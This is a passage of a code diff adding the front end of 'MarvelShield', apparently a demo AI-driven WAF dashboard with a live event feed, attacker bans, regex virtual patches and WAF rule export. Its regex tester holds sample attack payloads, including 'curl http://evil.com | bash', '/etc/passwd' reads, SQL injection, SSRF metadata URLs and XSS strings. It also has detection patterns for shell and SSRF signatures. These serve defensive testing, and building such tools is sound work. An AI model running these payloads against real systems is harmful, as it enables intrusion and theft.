+        <span>🕵️ Attacker Intel</span>
+        <span id="attacker-count">0 profiled</span>
+      </div>
+      <div id="attacker-list">
+        <div style="padding:16px;font-size:12px;color:var(--txt-dim);text-align:center;">
+          Profiling repeat offenders…
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+</div>
+
+<!-- ── Threat Timeline ───────────────────────────────────────────────────── -->
+<div class="timeline-section">
+  <div class="panel-header">
+    <span>⏳ Threat Timeline — Attack Lifecycle History</span>
+    <span id="timeline-count">0 threats tracked</span>
+  </div>
+  <div id="timeline-entries">
+    <div class="tl-empty">No threats recorded yet. Run the simulation to see attack lifecycles appear here…</div>
+  </div>
+</div>
+
+<!-- ── Patch Detail Modal ────────────────────────────────────────────────── -->
+<div class="modal-overlay" id="patch-modal" role="dialog" aria-modal="true">
+  <div class="modal-card" id="patch-modal-card">
+    <div class="modal-header">
+      <span class="modal-title">🔧 VIRTUAL PATCH — DETAIL VIEW</span>
+      <button class="modal-close" id="modal-close-btn" aria-label="Close">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="modal-hero">
+        <span class="modal-sev-badge" id="m-sev"></span>
+        <span class="modal-attack-name" id="m-attack"></span>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-section-label">Why was this blocked?</div>
+        <div class="modal-section-value" id="m-reasoning"></div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-section-label">Regex Pattern Applied</div>
+        <div class="modal-regex-box">
+          <span class="modal-regex-text" id="m-regex"></span>
+          <button class="modal-copy-btn" id="m-copy-btn">Copy</button>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-section-label">Example Payloads — Live Test</div>
+        <div class="modal-payloads" id="m-payloads"></div>
+      </div>
+
+      <div class="modal-meta-row">
+        <span><span class="modal-status-dot" id="m-status-dot"></span> <span id="m-status-label">ACTIVE</span> &nbsp;·&nbsp; <span id="m-cve"></span></span>
+        <span>Trace: <span id="m-trace"></span></span>
+        <span id="m-time"></span>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-section-label">AI Confidence Score</div>
+        <div class="conf-row" id="m-conf-row">
+          <span class="conf-label" id="m-conf-label">Confidence</span>
+          <div class="conf-bar-wrap"><div class="conf-bar-fill" id="m-conf-bar"></div></div>
+          <span class="conf-pct" id="m-conf-pct">—</span>
+        </div>
+        <div id="m-provisional-note" style="display:none;margin-top:6px;font-size:11px;color:#ff7b39;">
+          ⏱ <strong>Provisional patch</strong> — low confidence. Auto-expires in 5 min to prevent false positives.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── WAF Export Modal ──────────────────────────────────────────────────── -->
+<div class="modal-overlay" id="waf-modal" role="dialog" aria-modal="true"
+     style="display:none;z-index:1100;">
+  <div class="modal-card" style="max-width:720px;width:95%;">
+    <div class="modal-header">
+      <span class="modal-title">⬇ Export Patches as WAF Rules</span>
+      <button class="modal-close" id="waf-modal-close">✕</button>
+    </div>
+    <div class="modal-body">
+      <div id="waf-tabs" style="display:flex;gap:6px;margin-bottom:14px;">
+        <button class="waf-tab active" data-tab="nginx">Nginx</button>
+        <button class="waf-tab"        data-tab="modsecurity">ModSecurity</button>
+        <button class="waf-tab"        data-tab="aws_waf">AWS WAF JSON</button>
+      </div>
+      <div style="position:relative;">
+        <pre id="waf-code" style="background:#0d0d0f;border:1px solid var(--border);
+          border-radius:8px;padding:14px;font-size:11px;line-height:1.6;
+          max-height:420px;overflow:auto;white-space:pre;color:#e0e0e0;
+          margin:0;font-family:var(--font-mono);"></pre>
+        <button id="waf-copy-btn"
+          style="position:absolute;top:8px;right:8px;font-size:11px;
+                 padding:3px 10px;border-radius:5px;border:1px solid #2a3558;
+                 background:rgba(255,255,255,0.07);color:#6b7aa0;cursor:pointer;
+                 font-family:var(--font);">
+          Copy
+        </button>
+      </div>
+      <div style="margin-top:12px;display:flex;gap:10px;flex-wrap:wrap;">
+        <a id="waf-dl-nginx" href="/patches/export?format=nginx"
+           download="marvelshield_nginx.conf"
+           style="font-size:11px;color:var(--purple-lt);text-decoration:none;
+                  border:1px solid #2a3558;border-radius:5px;padding:4px 10px;">
+          ⬇ nginx.conf
+        </a>
+        <a id="waf-dl-modsec" href="/patches/export?format=modsecurity"
+           download="marvelshield_modsec.conf"
+           style="font-size:11px;color:var(--purple-lt);text-decoration:none;
+                  border:1px solid #2a3558;border-radius:5px;padding:4px 10px;">
+          ⬇ modsecurity.conf
+        </a>
+        <a id="waf-dl-aws" href="/patches/export?format=aws_waf"
+           download="marvelshield_aws_waf.json"
+           style="font-size:11px;color:var(--purple-lt);text-decoration:none;
+                  border:1px solid #2a3558;border-radius:5px;padding:4px 10px;">
+          ⬇ aws_waf.json
+        </a>
+        <span id="waf-patch-count"
+              style="font-size:11px;color:var(--txt-dim);margin-left:auto;
+                     align-self:center;"></span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── Alert Sound System ──────────────────────────────────────────────────────
+let alertsMuted = false;
+let audioCtx = null;
+
+function ensureAudio() {
+  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  return audioCtx;
+}
+
+/**
+ * Play a distinct tone for each security event type.
+ * 'block'  — descending two-tone (threat neutralised)
+ * 'patch'  — ascending two-tone with reverb-like decay (new patch deployed)
+ * 'ban'    — low sawtooth pulse (IP permanently banned)
+ */
+function playAlert(type = 'block') {
+  if (alertsMuted) return;
+  try {
+    const ctx   = ensureAudio();
+    const osc   = ctx.createOscillator();
+    const gain  = ctx.createGain();
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    const t = ctx.currentTime;
+
+    if (type === 'patch') {
+      osc.type = 'sine';
+      osc.frequency.setValueAtTime(660, t);
+      osc.frequency.setValueAtTime(990, t + 0.12);
+      osc.frequency.setValueAtTime(1320, t + 0.24);
+      gain.gain.setValueAtTime(0.25, t);
+      gain.gain.exponentialRampToValueAtTime(0.001, t + 0.55);
+      osc.start(t); osc.stop(t + 0.55);
+    } else if (type === 'ban') {
+      osc.type = 'sawtooth';
+      osc.frequency.setValueAtTime(160, t);
+      osc.frequency.setValueAtTime(120, t + 0.18);
+      gain.gain.setValueAtTime(0.2, t);
+      gain.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
+      osc.start(t); osc.stop(t + 0.5);
+    } else {
+      // 'block' — sharp descending ping
+      osc.type = 'sine';
+      osc.frequency.setValueAtTime(880, t);
+      osc.frequency.setValueAtTime(550, t + 0.14);
+      gain.gain.setValueAtTime(0.28, t);
+      gain.gain.exponentialRampToValueAtTime(0.001, t + 0.32);
+      osc.start(t); osc.stop(t + 0.32);
+    }
+  } catch (_) { /* AudioContext unavailable — silent fail */ }
+}
+
+// ── Attack Definitions ──────────────────────────────────────────────────────
+const ATTACK_DEFINITIONS = {
+  'SQL Injection':      'Malicious SQL code is inserted into a query input, granting the attacker unauthorized read, write, or delete access to the database.',
+  'XSS':               'Cross-Site Scripting — attacker injects malicious scripts into pages viewed by other users, enabling session hijacking, credential theft, or page defacement.',
+  'Command Injection':  'The application passes unsanitised user input to an OS shell, allowing the attacker to execute arbitrary commands on the server.',
+  'Code Injection':     'Language-level code (eval/exec/system) is injected and executed inside the application process, enabling full Remote Code Execution (RCE).',
+  'Path Traversal':     '"../" sequences escape the web root, letting the attacker read or overwrite arbitrary files on the server (e.g. /etc/passwd, private keys).',
+  'SSRF':               'Server-Side Request Forgery — the server is tricked into making requests to internal services (metadata APIs, Redis, etc.), bypassing firewall rules.',
+  'LFI':               'Local File Inclusion — the server includes a local file chosen by the attacker, potentially exposing source code, config files, or log-poisoning payloads.',
+  'RFI':               'Remote File Inclusion — the server fetches and executes a remote attacker-controlled script, leading directly to Remote Code Execution.',
+  'XXE':               'XML External Entity — specially crafted XML forces the parser to disclose local files or initiate internal network requests.',
+  'LDAP Injection':    'Malicious LDAP syntax injected into directory queries can bypass authentication or leak the entire user directory.',
+  'NoSQL Injection':   'Query operators ($where, $gt) are injected into NoSQL database inputs to bypass authentication or exfiltrate data without writing SQL.',
+  'Open Redirect':     'The application redirects users to an attacker-controlled URL, enabling phishing attacks and OAuth token theft.',
+  'CRLF Injection':    'Carriage-return / line-feed characters split HTTP responses, allowing the attacker to inject headers, set cookies, or perform cache poisoning.',
+  'Template Injection':'Server-Side Template Injection (SSTI) — template syntax executed server-side enables RCE when user input reaches a template engine unescaped.',
+};
+
+// ── State ──────────────────────────────────────────────────────────────────
+const stats = { total: 0, attacks: 0, clean: 0, blocked: 0, patches: 0 };
+const attackTypes = { cmd: 0, ssrf: 0, sqli: 0, other: 0 };
+const patches = new Map();              // regex → { timestamp, trace_id }
+const pendingAttacks = new Map();       // trace_id → { timestamp }
+const attackerProfiles = new Map();     // ip → { total_attacks, attack_types, status, ... }
+let   bannedCount = 0;
+let   fpPassed = 0;
+let   fpFailed = 0;
+
+// ── Timeline state ──────────────────────────────────────────────────────────
+const timelineTraces   = new Map(); // trace_id → lifecycle entry
+const patchToTrace     = new Map(); // regex_patch → original trace_id
+const pendingTimelines = new Map(); // trace_id → incoming event data (pre-diagnosis)
+const TL_MAX = 20;                  // max lifecycle cards shown
+let eventCount = 0;
+let lastTTN = null;
+
+// ── Socket.io ──────────────────────────────────────────────────────────────
+const socket = io('http://localhost:3000', {
+  transports:          ['polling', 'websocket'], // polling first — reliable over WSL2
+  reconnectionAttempts: Infinity,
+  reconnectionDelay:    1500,
+  timeout:              20000,
+});
+
+socket.on('connect', () => {
+  const el = document.getElementById('conn-status');
+  el.className = 'status-pill online';
+  document.getElementById('conn-label').textContent = 'LIVE';
+  addSystemEvent('Connected to MarvelShield bridge', 'green');
+});
+
+socket.on('disconnect', () => {
+  const el = document.getElementById('conn-status');
+  el.className = 'status-pill offline';
+  document.getElementById('conn-label').textContent = 'DISCONNECTED';
+  addSystemEvent('Lost connection to bridge — reconnecting…', 'red');
+});
+
+socket.on('connect_error', (err) => {
+  console.error('[socket] connect_error:', err.message);
+  addSystemEvent(`Bridge connection error: ${err.message}`, 'red');
+});
+
+socket.on('security_event', (data) => {
+  handleEvent(data);
+  updateTimeline(data);    // feed every event into the timeline engine
+});
+
+socket.on('timeline_history', (history) => {
+  // Replay persisted events in chronological order (oldest first)
+  history.forEach(d => updateTimeline(d));
+});
+
+// ── Event Router ───────────────────────────────────────────────────────────
+function handleEvent(data) {
+  switch (data.type) {
+    case 'incoming':               onIncoming(data);               break;
+    case 'diagnosis':              onDiagnosis(data);              break;
+    case 'blocked':                onBlocked(data);                break;
+    case 'patch_expired':          onPatchExpired(data);           break;
+    case 'attacker_profile_update': onAttackerProfile(data);       break;
+    case 'attacker_banned':        onAttackerBanned(data);         break;
+    case 'false_positive_result':  onFalsePositiveResult(data);    break;
+  }
+}
+
+// ── Attacker profile update ─────────────────────────────────────────────────
+function onAttackerProfile(d) {
+  updateAttackerRow(d);
+}
+
+function onAttackerBanned(d) {
+  // Dramatic red screen flash + ban alert sound
+  const flash = document.createElement('div');
+  flash.className = 'ban-flash';
+  document.body.appendChild(flash);
+  setTimeout(() => flash.remove(), 1400);
+  playAlert('ban');
+
+  // Update profile in the intel panel
+  updateAttackerRow({ ...d, status: 'banned' });
+
+  // Increment banned stat
+  bannedCount++;
+  const el = document.getElementById('s-banned');
+  el.textContent = bannedCount;
+  el.classList.remove('flash'); void el.offsetWidth; el.classList.add('flash');
+
+  // Big red event in the feed
+  const types = (d.attack_types || []).join(', ');
+  addEvent('malicious', '🚨', 'IP BANNED', d,
+    `<span style="color:var(--red);font-weight:bold;">${escHtml(d.ip)}</span> ` +
+    `permanently banned after <strong>${d.total_attacks}</strong> attacks &nbsp;·&nbsp; ` +
+    `types: <span class="highlight">${escHtml(types)}</span> &nbsp;·&nbsp; ` +
+    `first seen: <span style="color:var(--text-dim)">${escHtml(d.first_seen||'')}</span>`
+  );
+}
+
+function updateAttackerRow(d) {
+  const ip       = d.ip;
+  if (!ip) return;
+  const total    = d.total_attacks || 0;
+  const status   = (d.status || 'active').toLowerCase();
+  const types    = (d.attack_types || []).join(', ');
+  const existing = attackerProfiles.get(ip);
+
+  attackerProfiles.set(ip, { total, status, types, first_seen: d.first_seen, last_seen: d.last_seen });
+
+  const list = document.getElementById('attacker-list');
+  // Remove placeholder
+  const placeholder = list.querySelector('[data-placeholder]');
+  if (placeholder) placeholder.remove();
+
+  // Find existing row or create new one
+  let row = list.querySelector(`[data-ip="${CSS.escape(ip)}"]`);
+  const countClass = total >= 3 ? 'c3p' : total >= 2 ? 'c2' : 'c1';
+  const rowHtml = `
+    <span class="attacker-ip" title="First seen: ${escHtml(d.first_seen||'')} | Last: ${escHtml(d.last_seen||'')}">
+      ${escHtml(ip)}
+    </span>
+    <span class="attacker-count ${countClass}">${total}</span>
+    <span class="attacker-types" title="${escHtml(types)}">${escHtml(types)}</span>
+    <span class="attacker-status ${status}">${status.toUpperCase()}</span>
+  `;
+  if (row) {
+    row.innerHTML = rowHtml;
+  } else {
+    row = document.createElement('div');
+    row.className   = 'attacker-row';
+    row.dataset.ip  = ip;
+    row.innerHTML   = rowHtml;
+    list.prepend(row);
+  }
+
+  document.getElementById('attacker-count').textContent =
+    `${attackerProfiles.size} profiled`;
+}
+
+function onPatchExpired(d) {
+  const regex = d.regex_patch;
+  if (regex && patches.has(regex)) {
+    patches.delete(regex);
+    stats.patches = patches.size;
+    updateStat('patches');
+    document.getElementById('patch-count').textContent = patches.size;
+  }
+  // Dim the corresponding card in the DOM
+  const list = document.getElementById('patches-list');
+  list.querySelectorAll('.patch-item').forEach(el => {
+    if (el.dataset.regex === regex) el.classList.add('expired');
+  });
+  const confPct = typeof d.confidence === 'number' ? Math.round(d.confidence * 100) : '?';
+  addSystemEvent(
+    `⏱ Provisional patch auto-expired (confidence ${confPct}%): ${(regex || '').slice(0, 50)}`,
+    'yellow'
+  );
+}
+
+// ── False Positive Tester ───────────────────────────────────────────────────
+function onFalsePositiveResult(d) {
+  const { patch_id, regex_patch, passed, failed, total, attack_type } = d;
+
+  // Accumulate global totals
+  fpPassed += passed;
+  fpFailed += failed;
+
+  // Update the stats bar: show "0 FP" when clean, or count of false positives
+  const fpEl = document.getElementById('s-fp-clean');
+  if (fpEl) {
+    if (fpFailed === 0) {
+      fpEl.textContent = '0 FP';
+      fpEl.style.color = '#30d158';   // green
+    } else {
+      fpEl.textContent = `${fpFailed} FP`;
+      fpEl.style.color = '#ff9f0a';   // amber
+    }
+  }
+
+  // Attach a badge to the matching patch card in the sidebar
+  const patchList = document.getElementById('patches-list');
+  if (patchList) {
+    patchList.querySelectorAll('.patch-item').forEach(card => {
+      if (card.dataset.regex !== regex_patch) return;
+      // Remove any previous badge
+      const prev = card.querySelector('.fp-badge');
+      if (prev) prev.remove();
+      const badge = document.createElement('div');
+      if (failed === 0) {
+        badge.className = 'fp-badge fp-clean';
+        badge.textContent = `✅ ${passed}/${total} benign — 0 false positives`;
+      } else {
+        badge.className = 'fp-badge fp-warning';
+        badge.textContent = `⚠ ${failed}/${total} false positive${failed > 1 ? 's' : ''} detected`;
+      }
+      card.appendChild(badge);
+    });
+  }
+
+  const summary = failed === 0
+    ? `✅ FP test: ${passed}/${total} benign requests passed — 0 false positives (${attack_type})`
+    : `⚠ FP test: ${failed}/${total} benign requests BLOCKED — possible false positive (${attack_type})`;
+  addSystemEvent(summary, failed === 0 ? 'green' : 'yellow');
+}
+
+function onIncoming(d) {
+  stats.total++;
+  updateStat('total');
+  pendingAttacks.set(d.trace_id, { timestamp: d.timestamp });
+
+  const bodyHtml = d.body_preview
+    ? `<span class="highlight">${escHtml(d.body_preview)}</span>`
+    : '<span style="color:var(--muted)">no body</span>';
+
+  addEvent('incoming', '📡', 'INCOMING', d,
+    `IP: <span class="ip">${escHtml(d.client_ip)}</span> &nbsp;|&nbsp; Body: ${bodyHtml}`
+  );
+}
+
+function onDiagnosis(d) {
+  const isMalicious = d.status === 'malicious';
+
+  if (isMalicious) {
+    stats.attacks++;
+    updateStat('attacks');
+    classifyAttack(d.attack_type || d.path, d.regex_patch || '');
+
+    const sevHtml  = d.severity
+      ? `<span class="patch-severity sev-${d.severity}">${escHtml(d.severity)}</span>` : '';
+    const cveHtml  = d.cve       ? ` &nbsp;<span style="color:var(--blue)">${escHtml(d.cve)}</span>` : '';
+    const typeHtml = d.attack_type ? `<span class="highlight">${escHtml(d.attack_type)}</span>` : 'Attack';
+    const reasonHtml = d.reasoning
+      ? `<br/><span style="color:var(--text-dim);font-style:italic">"${escHtml(d.reasoning)}"</span>` : '';
+
+    addEvent('malicious', '🔴', 'MALICIOUS', d,
+      `${sevHtml}${cveHtml} AI Verdict: ${typeHtml} detected`
+      + reasonHtml
+      + (d.regex_patch
+        ? `<br/>Patch: <span class="patch-re">${escHtml(d.regex_patch)}</span>`
+        : '')
+    );
+
+    if (d.regex_patch) {
+      deployPatch(d);
+    }
+  } else {
+    stats.clean++;
+    updateStat('clean');
+    addEvent('clean', '✅', 'CLEAN', d, 'AI Verdict: No threat detected');
+  }
+}
+
+function onBlocked(d) {
+  stats.blocked++;
+  updateStat('blocked');
+  playAlert('block');
+
+  // IP-banned block — these requests never emit an 'incoming' event so we
+  // must increment the total-requests counter here to keep counts consistent.
+  if (d.reason === 'ip_banned') {
+    stats.total++;
+    updateStat('total');
+    addEvent('blocked', '🚫', 'IP BANNED', d,
+      `<span style="color:var(--red);font-weight:bold;">${escHtml(d.client_ip||'')}</span> ` +
+      `blocked at gateway — known attacker on permanent ban list`
+    );
+    pendingAttacks.delete(d.trace_id);
+    return;
+  }
+
+  // Calculate time-to-neutralize from first incoming attack to first block
+  const pending = pendingAttacks.get(d.trace_id);
+  const ttnSource = pending ? pending.timestamp : null;
+
+  // Find the original attack that generated this patch
+  const patchData = patches.get(d.pattern);
+  const originTs  = patchData ? patchData.timestamp : ttnSource;
+  const ttn = originTs ? (d.timestamp - originTs).toFixed(2) : null;
+
+  if (ttn !== null) {
+    lastTTN = ttn;
+    const ttnEl = document.getElementById('ttn-value');
+    ttnEl.textContent = ttn;
+    ttnEl.classList.remove('flash');
+    void ttnEl.offsetWidth;
+    ttnEl.classList.add('flash');
+  }
+
+  addEvent('blocked', '🛡️', 'BLOCKED', d,
+    `Pattern matched: <span class="patch-re">${escHtml(d.pattern)}</span>`
+    + (ttn ? `<br/><span class="neutralized">⚡ Neutralized in ${ttn}s</span>` : '')
+  );
+
+  pendingAttacks.delete(d.trace_id);
+}
+
+// ── Helpers ────────────────────────────────────────────────────────────────
+function deployPatch(d) {
+  const regex = d.regex_patch;
+  if (patches.has(regex)) return;
+  patches.set(regex, { traceId: d.trace_id, timestamp: d.timestamp });
+  playAlert('patch');
+
+  stats.patches = patches.size;
+  updateStat('patches');
+  document.getElementById('patch-count').textContent = patches.size;
+
+  const list = document.getElementById('patches-list');
+  const noP  = list.querySelector('.no-patches');
+  if (noP) noP.remove();
+
+  const idx        = patches.size;
+  const sev        = d.severity || '';
+  const sevClass   = sev ? `sev-${sev}` : '';
+  const conf       = typeof d.confidence === 'number' ? d.confidence : 1.0;
+  const confPct    = Math.round(conf * 100);
+  const confClass  = conf >= 0.9 ? 'conf-high' : conf >= 0.7 ? 'conf-medium' : 'conf-low';
+  const isLowConf  = conf < 0.7;
+  const item       = document.createElement('div');
+  item.className   = 'patch-item';
+  item.title       = 'Click to view patch details';
+  item.dataset.regex = regex;
+  item.innerHTML = `
+    <div class="patch-index">
+      <span>PATCH #${idx} &nbsp;·&nbsp; ${escHtml(d.trace_id ? d.trace_id.slice(0,8)+'…' : '')}</span>
+      <span style="display:flex;align-items:center;gap:6px;">
+        ${sev ? `<span class="patch-severity ${sevClass}">${escHtml(sev)}</span>` : ''}
+        ${isLowConf ? '<span class="provisional-badge">Provisional</span>' : ''}
+      </span>
+    </div>
+    ${d.attack_type ? `<div class="patch-attack-type">⚡ ${escHtml(d.attack_type)}</div>` : ''}
+    ${d.attack_type && ATTACK_DEFINITIONS[d.attack_type]
+        ? `<div class="patch-definition">ℹ️ ${escHtml(ATTACK_DEFINITIONS[d.attack_type])}</div>`
+        : ''}
+    <div class="patch-regex">${escHtml(regex)}</div>
+    ${d.reasoning ? `<div class="patch-reasoning">💡 ${escHtml(d.reasoning)}</div>` : ''}
+    <div class="conf-row ${confClass}" style="margin-top:6px;">
+      <span class="conf-label">Confidence</span>
+      <div class="conf-bar-wrap"><div class="conf-bar-fill" style="width:${confPct}%"></div></div>
+      <span class="conf-pct">${confPct}%</span>
+    </div>
+    <div class="patch-footer">
+      <span>${d.cve ? escHtml(d.cve) : ''}</span>
+      <span>${new Date((d.timestamp || Date.now()/1000) * 1000).toLocaleTimeString()}</span>
+    </div>
+  `;
+  item.addEventListener('click', () => openPatchModal(d));
+  list.prepend(item);
+}
+
+function classifyAttack(attackTypeOrPath, regex) {
+  const sig = (attackTypeOrPath + regex).toLowerCase();
+  if (/command injection|exec|cmd|rce|shell|;|\||&&/.test(sig)) { attackTypes.cmd++;   updateBreakdown(); }
+  else if (/ssrf|server.side|169\.254|http|url|fetch/.test(sig))  { attackTypes.ssrf++;  updateBreakdown(); }
+  else if (/sql injection|select|insert|drop|union/.test(sig))    { attackTypes.sqli++;  updateBreakdown(); }
+  else                                                             { attackTypes.other++; updateBreakdown(); }
+}
+
+function updateBreakdown() {
+  const total = attackTypes.cmd + attackTypes.ssrf + attackTypes.sqli + attackTypes.other || 1;
+  [['cmd','cmd'],['ssrf','ssrf'],['sqli','sqli'],['other','other']].forEach(([k,id]) => {
+    document.getElementById(`bc-${id}`).textContent = attackTypes[k];
+    document.getElementById(`bb-${id}`).style.width = (attackTypes[k] / total * 100) + '%';
+  });
+}
+
+function addEvent(cls, icon, typeLabel, d, detail) {
+  const feed  = document.getElementById('event-feed');
+  const entry = document.createElement('div');
+  entry.className = `event ${cls}`;
+  const ts = d.timestamp ? new Date(d.timestamp * 1000).toLocaleTimeString() : '';
+  entry.innerHTML = `
+    <span class="event-icon">${icon}</span>
+    <div class="event-body">
+      <div class="event-title">
+        <span class="event-type">${typeLabel}</span>
+        ${d.method ? `<span class="event-method">${escHtml(d.method)}</span>` : ''}
+        <span class="event-path">${escHtml(d.path || '')}</span>
+      </div>
+      <div class="event-detail">${detail}</div>
+    </div>
+    <span class="event-time">${ts}</span>
+  `;
+  feed.prepend(entry);   // newest at top
+
+  // Keep DOM lean — max 120 entries
+  const entries = feed.querySelectorAll('.event');
+  if (entries.length > 120) entries[entries.length - 1].remove();
+
+  eventCount++;
+  document.getElementById('event-count').textContent = `${eventCount} events`;
+}
+
+function addSystemEvent(msg, color) {
+  const feed  = document.getElementById('event-feed');
+  const entry = document.createElement('div');
+  entry.style.cssText = `padding:6px 12px;font-size:11px;color:var(--${color});opacity:0.6;border-bottom:1px solid var(--border);`;
+  entry.textContent = `◆ ${msg}`;
+  feed.prepend(entry);
+}
+
+function updateStat(key) {
+  const el = document.getElementById(`s-${key}`);
+  el.textContent = stats[key];
+  el.classList.remove('flash');
+  void el.offsetWidth;
+  el.classList.add('flash');
+}
+
+function escHtml(str) {
+  return String(str)
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+// ── Patch detail modal ──────────────────────────────────────────────────────
+
+const patchModal    = document.getElementById('patch-modal');
+const modalCloseBtn = document.getElementById('modal-close-btn');
+
+function openPatchModal(d) {
+  const sev      = d.severity || '';
+  const sevClass = sev ? `sev-${sev}` : '';
+
+  // Hero
+  const sevEl = document.getElementById('m-sev');
+  sevEl.textContent  = sev || 'UNKNOWN';
+  sevEl.className    = `modal-sev-badge patch-severity ${sevClass}`;
+  document.getElementById('m-attack').textContent    = d.attack_type  || 'Unknown Attack';
+  document.getElementById('m-reasoning').textContent = d.reasoning   || 'No reasoning provided.';
+  document.getElementById('m-regex').textContent     = d.regex_patch  || '';
+
+  // CVE / trace / time
+  document.getElementById('m-cve').textContent   = d.cve || d.cve_reference || '';
+  document.getElementById('m-trace').textContent = d.trace_id ? d.trace_id.slice(0,8) + '…' : '—';
+  document.getElementById('m-time').textContent  =
+    new Date((d.timestamp || Date.now()/1000) * 1000).toLocaleTimeString();
+
+  // Confidence
+  const conf      = typeof d.confidence === 'number' ? d.confidence : 1.0;
+  const confPct   = Math.round(conf * 100);
+  const confClass = conf >= 0.9 ? 'conf-high' : conf >= 0.7 ? 'conf-medium' : 'conf-low';
+  const isLowConf = conf < 0.7;
+  const confRow   = document.getElementById('m-conf-row');
+  confRow.className = `conf-row ${confClass}`;
+  document.getElementById('m-conf-bar').style.width = confPct + '%';
+  document.getElementById('m-conf-pct').textContent = confPct + '%';
+  document.getElementById('m-conf-label').textContent =
+    isLowConf ? 'Low confidence' : conf >= 0.9 ? 'High confidence' : 'Medium confidence';
+  document.getElementById('m-provisional-note').style.display = isLowConf ? 'block' : 'none';
+  // Update status dot and label
+  const statusDot   = document.getElementById('m-status-dot');
+  const statusLabel = document.getElementById('m-status-label');
+  if (isLowConf) {
+    statusDot.style.background   = '#ff7b39';
+    statusLabel.textContent      = 'PROVISIONAL';
+    statusLabel.style.color      = '#ff7b39';
+  } else {
+    statusDot.style.background   = '';
+    statusLabel.textContent      = 'ACTIVE';
+    statusLabel.style.color      = '';
+  }
+
+  // Live payload tester
+  buildPayloadTests(d.regex_patch || '', d.attack_type || '');
+
+  // Copy button
+  const copyBtn = document.getElementById('m-copy-btn');
+  copyBtn.textContent = 'Copy';
+  copyBtn.className   = 'modal-copy-btn';
+  copyBtn.onclick = () => {
+    navigator.clipboard.writeText(d.regex_patch || '').then(() => {
+      copyBtn.textContent = '✓ Copied';
+      copyBtn.classList.add('copied');
+      setTimeout(() => { copyBtn.textContent = 'Copy'; copyBtn.classList.remove('copied'); }, 1800);
+    });
+  };
+
+  patchModal.classList.add('open');
+  document.body.style.overflow = 'hidden';
+}
+
+function closePatchModal() {
+  patchModal.classList.remove('open');
+  document.body.style.overflow = '';
+}
+
+// Build live regex test rows from known attack families
+function buildPayloadTests(regexStr, attackType) {
+  const container = document.getElementById('m-payloads');
+  container.innerHTML = '';
+
+  // Curated examples per attack type + generic examples that exercise the regex
+  const attackMap = {
+    'command injection': [
+      'ls; cat /etc/passwd',
+      'echo hello && id',
+      'curl http://evil.com | bash',
+      '`whoami`',
+      'echo hello',
+    ],
+    'sql injection': [
+      "' OR 1=1 --",
+      "admin'--",
+      "1; DROP TABLE users",
+      '1 UNION SELECT * FROM secrets',
+      'select username from users',
+    ],
+    'ssrf': [
+      'http://169.254.169.254/latest/meta-data',
+      'http://localhost/admin',
+      'file:///etc/passwd',
+      'http://example.com/api/data',
+    ],
+    'path traversal': [
+      '../../etc/passwd',
+      '..\\..\\windows\\system32',
+      '/etc/shadow',
+      '/api/v1/users',
+    ],
+    'xss': [
+      '<scr\x69pt>alert(1)<\/script>',
+      '"><img src=x onerror=alert(1)>',
+      'javascript:void(0)',
+      'Hello World',
+    ],
+  };
+
+  // Pick the right examples or fallback to a generic set
+  const key = Object.keys(attackMap).find(k => attackType.toLowerCase().includes(k));
+  const examples = key ? attackMap[key] : [
+    'normal safe input',
+    'another clean value',
+    regexStr.slice(0, 20) + ' (synthetic match)',
+  ];
+
+  let re = null;
+  try { re = new RegExp(regexStr, 'i'); } catch (_) { /* invalid regex */ }
+
+  examples.forEach(payload => {
+    const matches = re ? re.test(payload) : false;
+    const row = document.createElement('div');
+    row.className = 'modal-payload-row';
+    row.innerHTML =
+      `<span class="${matches ? 'modal-payload-match' : 'modal-payload-nomatch'}">`
+      + (matches ? '🚫 BLOCK' : '✅ PASS ') + '</span>'
+      + `<span class="modal-payload-label">${escHtml(payload)}</span>`;
+    container.appendChild(row);
+  });
+}
+
+// Close triggers
+modalCloseBtn.addEventListener('click', closePatchModal);
+patchModal.addEventListener('click', e => { if (e.target === patchModal) closePatchModal(); });
+document.addEventListener('keydown',  e => { if (e.key === 'Escape') { closePatchModal(); closeWafModal(); } });
+
+// ── WAF Export Modal ────────────────────────────────────────────────────────
+
+const wafModal    = document.getElementById('waf-modal');
+const wafCode     = document.getElementById('waf-code');
+const wafCopyBtn  = document.getElementById('waf-copy-btn');
+const wafTabs     = document.querySelectorAll('.waf-tab');
+
+let wafData = null;          // cached response from /patches/export
+let activeWafTab = 'nginx';  // currently displayed tab
+
+function openWafModal() {
+  wafModal.style.display = 'flex';
+  wafCode.textContent    = 'Loading…';
+  document.getElementById('waf-patch-count').textContent = '';
+
+  fetch('http://localhost:8000/patches/export')
+    .then(r => r.json())
+    .then(data => {
+      wafData = data;
+      document.getElementById('waf-patch-count').textContent =
+        `${data.patch_count} active patch${data.patch_count !== 1 ? 'es' : ''}`;
+      renderWafTab(activeWafTab);
+    })
+    .catch(err => {
+      wafCode.textContent = `Error fetching rules: ${err.message}\n\nMake sure the gateway is running on port 8000.`;
+    });
+}
+
+function closeWafModal() {
+  wafModal.style.display = 'none';
+}
+
+function renderWafTab(tab) {
+  activeWafTab = tab;
+  wafTabs.forEach(btn => btn.classList.toggle('active', btn.dataset.tab === tab));
+  if (!wafData) return;
+  if (tab === 'aws_waf') {
+    wafCode.textContent = JSON.stringify(wafData.aws_waf, null, 2);
+  } else if (tab === 'modsecurity') {
+    wafCode.textContent = wafData.modsecurity_rules;
+  } else {
+    wafCode.textContent = wafData.nginx_rules;
+  }
+}
+
+// Wire up controls
+document.getElementById('export-waf-btn').addEventListener('click', openWafModal);
+document.getElementById('waf-modal-close').addEventListener('click', closeWafModal);
+wafModal.addEventListener('click', e => { if (e.target === wafModal) closeWafModal(); });
+
+// Mute toggle
+(function () {
+  const btn = document.getElementById('mute-btn');
+  btn.addEventListener('click', () => {
+    alertsMuted = !alertsMuted;
+    btn.textContent = alertsMuted ? '🔇' : '🔊';
